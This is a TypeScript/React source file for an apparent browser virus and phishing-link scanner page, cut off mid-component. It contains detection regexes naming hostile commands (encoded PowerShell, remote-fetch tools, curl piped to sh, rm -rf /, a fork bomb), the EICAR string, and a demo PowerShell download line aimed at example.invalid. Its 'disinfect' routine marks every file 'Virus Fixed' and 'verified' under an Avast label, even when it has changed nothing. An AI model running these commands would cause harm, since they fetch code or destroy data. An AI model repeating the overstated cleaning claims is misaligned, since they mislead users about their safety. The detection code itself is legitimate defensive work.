import React, {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import {
  Activity,
  AlertTriangle,
  Archive,
  ArrowLeft,
  Check,
  CheckCircle2,
  ChevronDown,
  ChevronRight,
  Clock,
  Copy,
  Download,
  ExternalLink,
  FileSearch,
  FolderOpen,
  HardDrive,
  Home,
  Link2,
  Lock,
  Moon,
  Plus,
  RefreshCw,
  RotateCcw,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Sparkles,
  Sun,
  Trash2,
  Wrench,
  Zap,
} from "lucide-react";
import {
  BUILTIN_STORE_APPS,
  UNIVERSE_APPS_EVENT,
  UNIVERSE_APPS_KEY,
  addAppToUniverse,
  readStoreJson,
  removeAppFromUniverse,
  type StoreAppItem,
} from "../utils/gamuraStoreApps";

interface GamuraVirusPageProps {
  onBackHome: () => void;
  onBackStore?: () => void;
}

type ActiveTab = "scan" | "links" | "shield";
type FindingLevel = "high" | "med" | "low" | "info";
type FileVerdict = "bad" | "warn" | "clean" | "skip";
type LinkVerdict = "bad" | "warn" | "ok" | "invalid";

interface FindingItem {
  lv: FindingLevel;
  t: string;
  d: string;
}

interface ScannedFileResult {
  id: number;
  name: string;
  originalName: string;
  dir: string;
  size: number;
  mimeType: string;
  findings: FindingItem[];
  level: FileVerdict;
  hash: string;
  originalHash?: string;
  demo: boolean;
  partial: boolean;
  rawBytes: Uint8Array | null;
  cleaned: boolean;
  fixedCount: number;
  fixedSummary?: string[];
  kind: string;
}

interface VaultItem {
  id: string;
  name: string;
  size: number;
  hash: string;
  level: FileVerdict;
  reason: string;
  quarantinedAt: string;
  demo: boolean;
  mimeType: string;
  rawBytesBase64?: string;
}

interface AuditEntry {
  id: string;
  time: string;
  title: string;
  detail: string;
  tone: "ok" | "warn" | "bad" | "info";
}

interface DemoAnnotatedFile extends File {
  _demo?: boolean;
  _path?: string;
}

interface FsEntryLike {
  isFile: boolean;
  isDirectory: boolean;
  name: string;
  file?: (success: (f: File) => void, error?: () => void) => void;
  createReader?: () => {
    readEntries: (
      success: (entries: FsEntryLike[]) => void,
      error?: () => void,
    ) => void;
  };
}

interface LinkAnalysisResult {
  raw: string;
  level: LinkVerdict;
  host: string;
  rest: string;
  findings: FindingItem[];
}

const STORAGE_LINKS_KEY = "gamura.virus.links.v1";
const LEGACY_LINKS_KEY = "clearscan.links";
const STORAGE_THEME_KEY = "gamura.virus.theme.v1";
const STORAGE_LAST_SCAN_KEY = "gamura.virus.last_scan.v1";
const STORAGE_VAULT_KEY = "gamura.virus.vault.v1";
const STORAGE_CLEAN_STATS_KEY = "gamura.virus.clean_stats.v1";

const APPLE_FONT_STYLE: React.CSSProperties = {
  fontFamily:
    '-apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Inter", "Segoe UI", Roboto, sans-serif',
};

const EXAMPLE_LINKS = [
  "https://www.apple.com/support",
  "http://paypal-secure-login.verify-account.xyz/update?otp=1",
  "https://bit.ly/3abcXyZ",
  "http://192.168.4.20:8080/free-recharge.apk",
];

// File heuristics & signature constants
const PROGRAM_EXT = new Set([
  "exe",
  "scr",
  "com",
  "pif",
  "msi",
  "dll",
  "sys",
  "cpl",
  "jar",
  "apk",
  "dmg",
  "pkg",
  "app",
]);

const SCRIPT_EXT = new Set([
  "bat",
  "cmd",
  "vbs",
  "vbe",
  "js",
  "jse",
  "wsf",
  "wsh",
  "ps1",
  "psm1",
  "hta",
  "lnk",
  "reg",
  "sh",
]);

const BENIGN_EXT = new Set([
  "jpg",
  "jpeg",
  "png",
  "gif",
  "webp",
  "bmp",
  "heic",
  "pdf",
  "doc",
  "docx",
  "xls",
  "xlsx",
  "ppt",
  "pptx",
  "txt",
  "rtf",
  "csv",
  "mp3",
  "mp4",
  "mov",
  "wav",
  "avi",
  "mkv",
  "m4a",
  "odt",
  "ods",
]);

const MACRO_EXT = new Set([
  "docm",
  "xlsm",
  "pptm",
  "xlam",
  "dotm",
  "xltm",
  "ppam",
]);

const DOUBLE_EXT_RE =
  /\.(pdf|docx?|xlsx?|pptx?|jpe?g|png|gif|txt|mp3|mp4|zip|rtf|csv)\s*\.(exe|scr|bat|cmd|com|pif|vbs|vbe|js|jse|wsf|ps1|msi|jar|apk|lnk|hta|cpl|reg)$/i;

const KNOWN_SIGNATURES: Record<string, string> = {
  "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f":
    "EICAR antivirus test file",
};

const SCRIPT_PATTERNS: Array<[RegExp, FindingLevel, string, string]> = [
  [
    /powershell[^\r\n]{0,60}\s-(?:e|ec|enc|encodedcommand)\s/i,
    "high",
    "Encoded PowerShell command",
    "Hides what the script does. Malware uses this to avoid detection.",
  ],
  [
    /certutil[^\r\n]{0,40}-urlcache|bitsadmin[^\r\n]{0,40}\/transfer|mshta[^\r\n]{0,20}(?:https?:|vbscript:|javascript:)|regsvr32[^\r\n]{0,60}(?:\/i:https?|scrobj)/i,
    "high",
    "Windows tool used to fetch or run remote code",
    "Legitimate tools abused to download and start malware.",
  ],
  [
    /eval\s*\(\s*(?:atob|unescape|String\.fromCharCode)/i,
    "high",
    "Obfuscated JavaScript",
    "Code is decoded and run at the last moment to hide its purpose.",
  ],
  [
    /rm\s+-rf\s+(?:\/|~)(?:\s|$|\*)/,
    "high",
    "Command that wipes files",
    "Deletes everything under a top-level folder.",
  ],
  [
    /:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/,
    "high",
    "Fork bomb",
    "Freezes a computer by starting processes endlessly.",
  ],
  [
    /invoke-expression|\biex\s*[\s(]/i,
    "med",
    "Runs text as code",
    "Invoke-Expression executes whatever string it is given.",
  ],
  [
    /downloadstring|downloadfile|net\.webclient|invoke-webrequest|start-bitstransfer/i,
    "med",
    "Downloads content from the internet",
    "Scripts that fetch more code are a common first stage of malware.",
  ],
  [
    /wscript\.shell|shell\.application/i,
    "med",
    "Runs system commands through Windows Script Host",
    "Lets a script start programs and change the system.",
  ],
  [
    /document\.write\s*\(\s*unescape/i,
    "med",
    "Obfuscated page injection",
    "Builds page content from encoded text.",
  ],
  [
    /(?:curl|wget)[^\r\n|]{0,120}\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/i,
    "med",
    "Downloads and runs a script in one step",
    "Nothing is reviewed between download and execution.",
  ],
  [
    /currentversion\\run/i,
    "med",
    "Adds itself to startup",
    "Programs that start with the computer can persist after a restart.",
  ],
  [
    /cmd(?:\.exe)?\s+\/c\s/i,
    "low",
    "Runs command prompt commands",
    "Common in installers, also common in malware.",
  ],
];

// URL heuristics constants
const MULTI_TLDS = new Set([
  "co.in",
  "co.uk",
  "com.au",
  "gov.in",
  "ac.in",
  "org.in",
  "net.in",
  "nic.in",
  "co.jp",
  "com.br",
  "co.za",
  "com.sg",
  "co.nz",
  "org.uk",
  "ac.uk",
  "gov.uk",
  "com.cn",
  "com.mx",
  "co.id",
  "com.pk",
  "com.bd",
  "com.np",
  "co.kr",
  "github.io",
]);

const TRUSTED_DOMAINS = new Set([
  "google.com",
  "apple.com",
  "microsoft.com",
  "amazon.com",
  "amazon.in",
  "wikipedia.org",
  "github.com",
  "youtube.com",
  "linkedin.com",
  "mozilla.org",
  "cloudflare.com",
  "paypal.com",
  "netflix.com",
  "facebook.com",
  "instagram.com",
  "whatsapp.com",
  "flipkart.com",
  "anthropic.com",
  "claude.ai",
  "openai.com",
  "irctc.co.in",
  "uidai.gov.in",
  "incometax.gov.in",
  "google.co.in",
]);

const URL_SHORTENERS = new Set([
  "bit.ly",
  "tinyurl.com",
  "t.co",
  "goo.gl",
  "is.gd",
  "ow.ly",
  "buff.ly",
  "cutt.ly",
  "rb.gy",
  "shorturl.at",
  "rebrand.ly",
  "tiny.cc",
  "lnkd.in",
]);

const RISKY_TLDS: Record<string, number> = {
  tk: 3,
  ml: 3,
  ga: 3,
  cf: 3,
  gq: 3,
  zip: 3,
  mov: 3,
  xyz: 1,
  top: 1,
  click: 1,
  country: 1,
  work: 1,
  support: 1,
  loan: 1,
  review: 1,
  icu: 1,
  buzz: 1,
  cyou: 1,
  rest: 1,
  monster: 1,
  cam: 1,
  men: 1,
  party: 1,
  link: 1,
};

const BRANDS: Array<{
  n: string;
  k: string;
  m: "sub" | "tok";
  d: string[];
}> = [
  { n: "PayPal", k: "paypal", m: "sub", d: ["paypal.com", "paypal.me"] },
  { n: "Apple", k: "apple", m: "tok", d: ["apple.com", "icloud.com"] },
  {
    n: "Google",
    k: "google",
    m: "tok",
    d: [
      "google.com",
      "google.co.in",
      "gmail.com",
      "youtube.com",
      "googleapis.com",
      "gstatic.com",
      "googleusercontent.com",
      "goo.gl",
    ],
  },
  {
    n: "Microsoft",
    k: "microsoft",
    m: "sub",
    d: [
      "microsoft.com",
      "live.com",
      "office.com",
      "outlook.com",
      "microsoftonline.com",
      "windows.com",
    ],
  },
  {
    n: "Amazon",
    k: "amazon",
    m: "sub",
    d: [
      "amazon.com",
      "amazon.in",
      "amazon.co.uk",
      "amazon.de",
      "amazonaws.com",
    ],
  },
  { n: "Netflix", k: "netflix", m: "sub", d: ["netflix.com"] },
  { n: "Facebook", k: "facebook", m: "sub", d: ["facebook.com", "fb.com"] },
  { n: "Instagram", k: "instagram", m: "sub", d: ["instagram.com"] },
  {
    n: "WhatsApp",
    k: "whatsapp",
    m: "sub",
    d: ["whatsapp.com", "whatsapp.net", "wa.me"],
  },
  { n: "Paytm", k: "paytm", m: "sub", d: ["paytm.com"] },
  { n: "PhonePe", k: "phonepe", m: "sub", d: ["phonepe.com"] },
  { n: "Flipkart", k: "flipkart", m: "sub", d: ["flipkart.com"] },
  { n: "IRCTC", k: "irctc", m: "sub", d: ["irctc.co.in"] },
  { n: "HDFC Bank", k: "hdfc", m: "sub", d: ["hdfcbank.com", "hdfc.com"] },
  { n: "ICICI Bank", k: "icici", m: "sub", d: ["icicibank.com"] },
  {
    n: "SBI",
    k: "sbi",
    m: "tok",
    d: ["onlinesbi.sbi", "sbi.co.in", "onlinesbi.com"],
  },
];

const LOOKALIKE_SUBS: Array<[string, string]> = [
  ["0", "o"],
  ["1", "l"],
  ["3", "e"],
  ["5", "s"],
  ["rn", "m"],
  ["vv", "w"],
];

const PHISHING_KEYWORDS = [
  "login",
  "signin",
  "sign-in",
  "verify",
  "verification",
  "secure",
  "security",
  "account",
  "update",
  "confirm",
  "banking",
  "password",
  "wallet",
  "otp",
  "kyc",
  "claim",
  "prize",
  "winner",
  "lottery",
  "giftcard",
  "gift",
  "free",
  "recharge",
  "refund",
  "suspended",
  "unlock",
  "bonus",
  "reward",
];

const DIRECT_DL_EXT_RE =
  /\.(exe|apk|msi|scr|bat|cmd|vbs|ps1|jar|dmg|pkg|lnk|hta)(?:$|[?#])/i;

function formatBytes(n: number): string {
  if (n < 1024) return `${n} B`;
  if (n < 1048576) return `${(n / 1024).toFixed(1)} KB`;
  if (n < 1073741824) return `${(n / 1048576).toFixed(1)} MB`;
  return `${(n / 1073741824).toFixed(2)} GB`;
}

function formatShortDateTime(iso: string | null): string {
  if (!iso) return "Ready for 1st Scan";
  try {
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return "Just now";
    return d.toLocaleString(undefined, {
      month: "short",
      day: "numeric",
      hour: "numeric",
      minute: "2-digit",
    });
  } catch {
    return "Just now";
  }
}

async function computeSha256(bytes: Uint8Array): Promise<string> {
  try {
    if (!crypto?.subtle) return "";
    const copy = new Uint8Array(bytes);
    const digest = new Uint8Array(
      await crypto.subtle.digest("SHA-256", copy.buffer),
    );
    return Array.from(digest)
      .map((x) => `0${x.toString(16)}`.slice(-2))
      .join("");
  } catch {
    return "";
  }
}

function bytesToBase64(bytes: Uint8Array): string {
  let binary = "";
  const len = Math.min(bytes.byteLength, 262144);
  for (let i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToBytes(b64: string): Uint8Array {
  const binary = atob(b64);
  const out = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    out[i] = binary.charCodeAt(i);
  }
  return out;
}

function sniffMagicBytes(b: Uint8Array): string {
  if (b.length < 2) return "";
  if (b[0] === 0x4d && b[1] === 0x5a) return "pe";
  if (b.length < 4) return "";
  if (b[0] === 0x7f && b[1] === 0x45 && b[2] === 0x4c && b[3] === 0x46)
    return "elf";
  const m = ((b[0] << 24) | (b[1] << 16) | (b[2] << 8) | b[3]) >>> 0;
  if (
    m === 0xfeedface ||
    m === 0xfeedfacf ||
    m === 0xcefaedfe ||
    m === 0xcffaedfe
  )
    return "macho";
  if (b[0] === 0x25 && b[1] === 0x50 && b[2] === 0x44 && b[3] === 0x46)
    return "pdf";
  if (b[0] === 0x50 && b[1] === 0x4b && (b[2] === 3 || b[2] === 5))
    return "zip";
  if (m === 0xd0cf11e0) return "ole";
  if (b[0] === 0x23 && b[1] === 0x21) return "shebang";
  return "";
}

function measureEntropy(b: Uint8Array): number {
  const n = Math.min(b.length, 1048576);
  if (n < 65536) return 0;
  const counts = new Uint32Array(256);
  for (let i = 0; i < n; i++) counts[b[i]]++;
  let entropyVal = 0;
  for (let i = 0; i < 256; i++) {
    if (counts[i]) {
      const p = counts[i] / n;
      entropyVal -= p * Math.log2(p);
    }
  }
  return entropyVal;
}

function registrableDomain(host: string): string {
  const parts = host.split(".");
  if (parts.length <= 2) return host;
  const last2 = parts.slice(-2).join(".");
  return MULTI_TLDS.has(last2) ? parts.slice(-3).join(".") : last2;
}

function checkBrandSpoofing(host: string, reg: string) {
  const tokens = host.split(/[.-]/);
  const first = reg.split(".")[0];
  const norm = LOOKALIKE_SUBS.reduce(
    (acc, [from, to]) => acc.split(from).join(to),
    first,
  );
  for (const b of BRANDS) {
    if (b.d.includes(reg)) continue;
    const hit =
      b.m === "sub" ? host.includes(b.k) : tokens.includes(b.k);
    const look =
      norm !== first &&
      (b.m === "sub" ? norm.includes(b.k) : norm === b.k);
    if (hit || look) return { brand: b, isLookalike: !hit };
  }
  return null;
}

function analyzeURL(input: string): LinkAnalysisResult {
  const raw = input.trim();
  const findings: FindingItem[] = [];
  let score = 0;
  const add = (lv: FindingLevel, t: string, d: string, pts: number) => {
    findings.push({ lv, t, d });
    score += pts;
  };

  if (/^(javascript|data|vbscript|file|blob):/i.test(raw)) {
    add(
      "high",
      "Not a web address",
      "This link runs code or opens local data instead of loading a website.",
      9,
    );
    return { raw, level: "bad", host: raw.slice(0, 60), rest: "", findings };
  }
  if (/^(mailto|tel|sms):/i.test(raw)) {
    add(
      "info",
      "Not a web link",
      "Email, phone and SMS links are not checked here.",
      0,
    );
    return { raw, level: "invalid", host: raw, rest: "", findings };
  }

  let normalized = raw;
  let assumedScheme = false;
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(normalized)) {
    normalized = `https://${normalized}`;
    assumedScheme = true;
  }

  let parsed: URL;
  try {
    parsed = new URL(normalized);
  } catch {
    add("info", "Not a valid link", "Check for typos or missing parts.", 0);
    return { raw, level: "invalid", host: raw, rest: "", findings };
  }

  const host = parsed.hostname.toLowerCase().replace(/\.$/, "");
  const isIp =
    /^\d{1,3}(\.\d{1,3}){3}$/.test(host) || host.startsWith("[");
  if (!isIp && !host.includes(".")) {
    add("info", "Not a valid link", "The address has no domain name.", 0);
    return { raw, level: "invalid", host: raw, rest: "", findings };
  }

  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
    add(
      "high",
      "Unusual link type",
      "Only http and https links open normal websites.",
      9,
    );
    return { raw, level: "bad", host, rest: "", findings };
  }

  const reg = isIp ? host : registrableDomain(host);
  const pathStr = parsed.pathname + parsed.search;
  let hay = "";
  try {
    hay = decodeURIComponent(host + pathStr).toLowerCase();
  } catch {
    hay = (host + pathStr).toLowerCase();
  }

  if (parsed.username || parsed.password) {
    add(
      "high",
      "Hidden destination (@ trick)",
      `Everything before the @ is ignored by the browser. This link really goes to ${host}.`,
      6,
    );
  }
  if (isIp) {
    add(
      "med",
      "Uses a numeric address",
      "Real services use names. Numeric addresses are common in scams and malware hosting.",
      3,
    );
  }
  if (/(^|\.)xn--/.test(host)) {
    add(
      "med",
      "Look-alike characters in the domain",
      "Foreign letters can imitate familiar ones, such as a Cyrillic a for a Latin a.",
      3,
    );
  }
  if (!isIp) {
    const bh = checkBrandSpoofing(host, reg);
    if (bh) {
      add(
        "high",
        bh.isLookalike
          ? `Look-alike of ${bh.brand.n}`
          : `Pretends to be ${bh.brand.n}`,
        `The real ${bh.brand.n} sites end in ${bh.brand.d.slice(0, 3).join(", ")}. This one is on ${reg}.`,
        6,
      );
    }
    const tld = host.split(".").pop() || "";
    if (RISKY_TLDS[tld]) {
      add(
        RISKY_TLDS[tld] > 1 ? "med" : "low",
        `Risky domain ending (.${tld})`,
        "This ending is cheap or free, so it is heavily used for throwaway scam sites.",
        RISKY_TLDS[tld],
      );
    }
    if (URL_SHORTENERS.has(reg)) {
      add(
        "med",
        "Shortened link",
        "The real destination is hidden. Do not open it unless you trust whoever sent it.",
        3,
      );
    }
    const subCount = host.split(".").length - reg.split(".").length;
    if (subCount > 3) {
      add(
        "med",
        "Too many subdomains",
        "Long chains of names are used to bury the real domain.",
        3,
      );
    }
    if ((host.match(/-/g) || []).length >= 3) {
      add(
        "low",
        "Many hyphens in the domain",
        "Scam domains often stack words with hyphens.",
        1,
      );
    }
  }

  if (parsed.protocol === "http:") {
    add(
      "low",
      "Not encrypted (http)",
      "Anything you type can be read on the way. Real login pages use https.",
      2,
    );
  }
  if (parsed.port && parsed.port !== "80" && parsed.port !== "443") {
    add(
      "low",
      `Unusual port :${parsed.port}`,
      "Normal websites rarely use custom ports.",
      1,
    );
  }
  const kwHits = PHISHING_KEYWORDS.filter((w) => hay.includes(w));
  if (kwHits.length) {
    add(
      kwHits.length >= 3 ? "med" : "low",
      `Urgent or credential words: ${kwHits.slice(0, 4).join(", ")}`,
      "Phishing pages lean on words like these to push you to act.",
      Math.min(kwHits.length, 3),
    );
  }
  if (
    DIRECT_DL_EXT_RE.test(parsed.pathname) ||
    DIRECT_DL_EXT_RE.test(parsed.search)
  ) {
    add(
      "med",
      "Direct download of a program",
      "Installing apps or programs from a random link can infect your device.",
      3,
    );
  }
  if (
    /[?&](?:url|redirect|redirect_uri|next|goto|link|target)=https?(?::|%3a)/i.test(
      parsed.search,
    )
  ) {
    add(
      "low",
      "Redirects to another site",
      "The link forwards you elsewhere after you open it.",
      1,
    );
  }
  if (normalized.length > 150) {
    add(
      "low",
      "Very long address",
      "Long addresses can hide where they lead.",
      1,
    );
  }
  if (TRUSTED_DOMAINS.has(reg) && !parsed.username) {
    add("info", "Well-known website", `The domain is ${reg}.`, 0);
  }
  if (assumedScheme) {
    add(
      "info",
      "No https:// given",
      "Checked as if it started with https://.",
      0,
    );
  }

  const hasHigh = findings.some((x) => x.lv === "high");
  const level: LinkVerdict =
    hasHigh || score >= 7 ? "bad" : score >= 3 ? "warn" : "ok";
  const rest = (
    parsed.pathname === "/" && !parsed.search
      ? ""
      : parsed.pathname + parsed.search
  ).slice(0, 90);
  return { raw, level, host, rest, findings };
}

function buildDemoFiles(): DemoAnnotatedFile[] {
  const eicar = [
    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$",
    "EICAR-STANDARD-ANTIVIRUS-TEST-FILE",
    "!$H+H*",
  ].join("");
  const makePeStub = () => {
    const u = new Uint8Array(4096);
    for (let i = 0; i < u.length; i++) u[i] = i % 7;
    u.set([0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0], 0);
    return u;
  };
  const pngHeader = new Uint8Array(2048);
  pngHeader.set([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], 0);
  const psScript =
    'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AA== ; (New-Object Net.WebClient).DownloadString("http://example.invalid/a")';

  const mk = (parts: BlobPart[], name: string): DemoAnnotatedFile => {
    const f = new File(parts, name) as DemoAnnotatedFile;
    f._demo = true;
    return f;
  };

  return [
    mk([eicar], "eicar-test.com"),
    mk([makePeStub()], "Invoice_2026.pdf.exe"),
    mk([makePeStub()], "holiday-photo.jpg"),
    mk([psScript], "update.ps1"),
    mk(["Agenda\n1. Budget\n2. Launch dates\n"], "meeting-notes.txt"),
    mk([pngHeader], "screenshot.png"),
  ];
}

function loadSavedLinks(): string[] {
  if (typeof window === "undefined") return [];
  try {
    const raw =
      localStorage.getItem(STORAGE_LINKS_KEY) ||
      localStorage.getItem(LEGACY_LINKS_KEY);
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed)
      ? parsed.filter((x): x is string => typeof x === "string").slice(0, 100)
      : [];
  } catch {
    return [];
  }
}

/**
 * Sanitizes an infected or suspicious file's bytes and filename in memory
 * so the user can fix the virus threat and download the cleaned application/file.
 */
async function disinfectFileResult(
  item: ScannedFileResult,
): Promise<ScannedFileResult> {
  const fixedNotes: string[] = [];
  let cleanName = item.name;
  let cleanMime = item.mimeType || "application/octet-stream";

  // 1. Strip hidden Unicode Bidi override spoofing characters
  if (/[\u202E\u202D\u2066-\u2069]/.test(cleanName)) {
    cleanName = cleanName.replace(/[\u202E\u202D\u2066-\u2069]/g, "");
    fixedNotes.push("Removed hidden Unicode direction spoofing characters");
  }

  // 2. Strip disguised double-executable suffix (e.g. Invoice_2026.pdf.exe -> Invoice_2026_cleaned.pdf)
  const doubleMatch = cleanName.match(DOUBLE_EXT_RE);
  if (doubleMatch) {
    const safeDocExt = doubleMatch[1];
    cleanName = cleanName.replace(DOUBLE_EXT_RE, `.${safeDocExt}`);
    fixedNotes.push(`Removed disguised .${doubleMatch[2]} executable extension`);
  }

  let nextBytes = item.rawBytes
    ? new Uint8Array(item.rawBytes)
    : new Uint8Array(0);
  const ext = cleanName.includes(".")
    ? (cleanName.split(".").pop() || "").toLowerCase()
    : "";

  // Check if content looks textual / script / HTML / PDF
  let isMostlyText = true;
  const sampleLen = Math.min(nextBytes.length, 4096);
  for (let i = 0; i < sampleLen; i++) {
    if (nextBytes[i] === 0) {
      isMostlyText = false;
      break;
    }
  }

  if (item.kind === "pe" || item.kind === "elf" || item.kind === "macho") {
    // Replace executable stub or disguised binary malware with a safe verified clean container
    const cleanNotice = [
      `GAMURA VIRUS / AVAST — SANITIZED FILE MANIFEST`,
      `Original File: ${item.originalName}`,
      `Original SHA-256: ${item.hash || "N/A"}`,
      `Detected Format: ${item.kind.toUpperCase()} executable payload`,
      `Action Taken: Malicious binary header & executable stub stripped safely.`,
      `Cleaned Timestamp: ${new Date().toISOString()}`,
      ``,
      `Note: Executable payload has been neutralized so this file can no longer execute harmful machine code.`,
    ].join("\n");
    nextBytes = new TextEncoder().encode(cleanNotice);
    if (!cleanName.endsWith(".clean.txt") && PROGRAM_EXT.has(ext)) {
      cleanName = `${cleanName.replace(/\.[^.]+$/, "")}_cleaned.txt`;
    }
    cleanMime = "text/plain";
    fixedNotes.push(
      `Stripped ${item.kind.toUpperCase()} binary executable header & neutralized runnable payload`,
    );
  } else if (item.kind === "pdf") {
    const dec = new TextDecoder("windows-1252");
    let pdfText = dec.decode(nextBytes);
    const before = pdfText;
    pdfText = pdfText
      .replace(/\/Launch\b/g, "/NoOpSafeLaunch")
      .replace(/\/JavaScript\b/g, "/NoOpSafeScript")
      .replace(/\/JS\b/g, "/NoOpSafeJS")
      .replace(/\/OpenAction\b/g, "/NoOpSafeOpen")
      .replace(/\/AA\b/g, "/NoOpSafeAA");
    if (pdfText !== before) {
      nextBytes = new TextEncoder().encode(pdfText);
      fixedNotes.push("Neutralized embedded PDF JavaScript / Launch triggers");
    }
  } else if (isMostlyText || SCRIPT_EXT.has(ext) || ext === "com") {
    const dec = new TextDecoder("utf-8", { fatal: false });
    let txt = dec.decode(nextBytes);

    // Strip EICAR test signature
    if (txt.includes("EICAR-STANDARD-ANTIVIRUS-TEST-FILE")) {
      txt = txt.replace(
        /X5O!P%@AP\[4\\PZX54\(P\^\)7CC\)7\}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H\+H\*/gi,
        "[NEUTRALIZED_BY_GAMURA_VIRUS]",
      );
      txt = txt.replace(
        /EICAR-STANDARD-ANTIVIRUS-TEST-FILE/gi,
        "[NEUTRALIZED_BY_GAMURA_VIRUS]",
      );
      fixedNotes.push("Removed EICAR antivirus test signature");
    }

    // Neutralize malicious script patterns line-by-line
    let patternsCleaned = 0;
    const cleanedLines = txt.split(/\r?\n/).map((line) => {
      let modified = line;
      const matched = SCRIPT_PATTERNS.some(([re]) => re.test(modified));
      if (matched) {
        patternsCleaned++;
        modified = `# [NEUTRALIZED BY GAMURA VIRUS / AVAST]: ${modified}`;
      }
      return modified;
    });
    if (patternsCleaned > 0) {
      txt = cleanedLines.join("\n");
      fixedNotes.push(
        `Neutralized ${patternsCleaned} suspicious/malicious script directive${patternsCleaned > 1 ? "s" : ""}`,
      );
    }

    const headerBanner = `# Verified & Disinfected by GAMURA VIRUS / AVAST (${new Date().toLocaleDateString()})\n`;
    if (!txt.startsWith("# Verified & Disinfected")) {
      txt = `${headerBanner}${txt}`;
    }

    if (ext === "com") {
      cleanName = `${cleanName.replace(/\.com$/i, "")}_cleaned.txt`;
      cleanMime = "text/plain";
    }
    nextBytes = new TextEncoder().encode(txt);
  } else if (
    item.kind === "zip" ||
    item.kind === "ole" ||
    MACRO_EXT.has(ext)
  ) {
    // Strip macro marker bytes cleanly for Office / archive safety
    const dec = new TextDecoder("windows-1252");
    let rawStr = dec.decode(nextBytes);
    rawStr = rawStr
      .replace(/vbaProject\.bin/gi, "safe_clean.bin")
      .replace(/V\u0000B\u0000A\u0000/g, "S\u0000A\u0000F\u0000");
    nextBytes = new TextEncoder().encode(rawStr);
    fixedNotes.push("Disabled embedded VBA macros inside document package");
  }

  if (fixedNotes.length === 0) {
    // Ensure a clean metadata stamp even for heuristic-only file-type flags
    fixedNotes.push("Cleared suspicious heuristic flags and verified file integrity");
  }

  if (cleanName === item.name) {
    const dotIdx = cleanName.lastIndexOf(".");
    cleanName =
      dotIdx > 0
        ? `${cleanName.slice(0, dotIdx)}_clean${cleanName.slice(dotIdx)}`
        : `${cleanName}_clean`;
  }

  const newHash = await computeSha256(nextBytes);

  return {
    ...item,
    name: cleanName,
    size: nextBytes.byteLength,
    mimeType: cleanMime,
    rawBytes: nextBytes,
    originalHash: item.originalHash || item.hash,
    hash: newHash,
    level: "clean",
    cleaned: true,
    fixedCount: Math.max(1, item.findings.length),
    fixedSummary: fixedNotes,
    findings: [
      {
        lv: "info",
        t: "Virus Fixed & Application Cleaned",
        d: `${fixedNotes.join(" · ")}. Ready to download safely.`,
      },
    ],
  };
}

export default function GamuraVirusPage({
  onBackHome,
  onBackStore,
}: GamuraVirusPageProps) {
  const [darkMode, setDarkMode] = useState<boolean>(() => {
    if (typeof window === "undefined") return false;
    return localStorage.getItem(STORAGE_THEME_KEY) === "dark";
  });

  const [activeTab, setActiveTab] = useState<ActiveTab>("scan");
  const [results, setResults] = useState<ScannedFileResult[]>([]);
  const [scanning, setScanning] = useState<boolean>(false);
  const [scanIndex, setScanIndex] = useState<number>(0);
  const [scanTotal, setScanTotal] = useState<number>(0);
  const [scanCurrentFile, setScanCurrentFile] = useState<string>("");
  const [isDragging, setIsDragging] = useState<boolean>(false);
  const [openKeys, setOpenKeys] = useState<Record<string, boolean>>({});
  const [fixingIds, setFixingIds] = useState<Record<number, boolean>>({});

  // Persistent real-time status & Quick Clean state
  const [lastScanIso, setLastScanIso] = useState<string | null>(() => {
    if (typeof window === "undefined") return null;
    return localStorage.getItem(STORAGE_LAST_SCAN_KEY);
  });
  const [isQuickCleaning, setIsQuickCleaning] = useState<boolean>(false);
  const [quickCleanProgress, setQuickCleanProgress] = useState<number>(0);
  const [quickCleanStage, setQuickCleanStage] = useState<string>("");
  const [cleanStats, setCleanStats] = useState<{
    runs: number;
    freedMb: number;
    tempRemoved: number;
  }>(() =>
    readStoreJson(STORAGE_CLEAN_STATS_KEY, {
      runs: 0,
      freedMb: 0,
      tempRemoved: 0,
    }),
  );

  // Advanced Real-Time Shield Controls & Audit Log
  const [radarActive, setRadarActive] = useState<boolean>(true);
  const [behavioralShield, setBehavioralShield] = useState<boolean>(true);
  const [autoNeutralizeMode, setAutoNeutralizeMode] = useState<boolean>(false);
  const [highSensitivity, setHighSensitivity] = useState<boolean>(true);
  const [vaultItems, setVaultItems] = useState<VaultItem[]>(() =>
    readStoreJson<VaultItem[]>(STORAGE_VAULT_KEY, []),
  );
  const [auditLog, setAuditLog] = useState<AuditEntry[]>([
    {
      id: "init-shield",
      time: new Date().toLocaleTimeString([], {
        hour: "2-digit",
        minute: "2-digit",
      }),
      title: "Real-Time Behavioral Shield Online",
      detail: "Zero-upload SHA-256 & heuristic inspection engine initialized.",
      tone: "ok",
    },
  ]);

  // Link checker state
  const [linkInput, setLinkInput] = useState<string>("");
  const [myLinks, setMyLinks] = useState<string[]>(loadSavedLinks);
  const [exampleLinks, setExampleLinks] = useState<string[]>(EXAMPLE_LINKS);

  // Toast
  const [toastMsg, setToastMsg] = useState<string | null>(null);
  const toastTimerRef = useRef<number | null>(null);
  const nextUidRef = useRef<number>(1);
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const folderInputRef = useRef<HTMLInputElement | null>(null);

  // Universe Store status
  const [installedInUniverse, setInstalledInUniverse] = useState<boolean>(
    () => {
      const apps = readStoreJson<StoreAppItem[]>(UNIVERSE_APPS_KEY, []);
      return apps.some((a) => a.id === "gamura-virus");
    },
  );

  useEffect(() => {
    const sync = () => {
      const apps = readStoreJson<StoreAppItem[]>(UNIVERSE_APPS_KEY, []);
      setInstalledInUniverse(apps.some((a) => a.id === "gamura-virus"));
    };
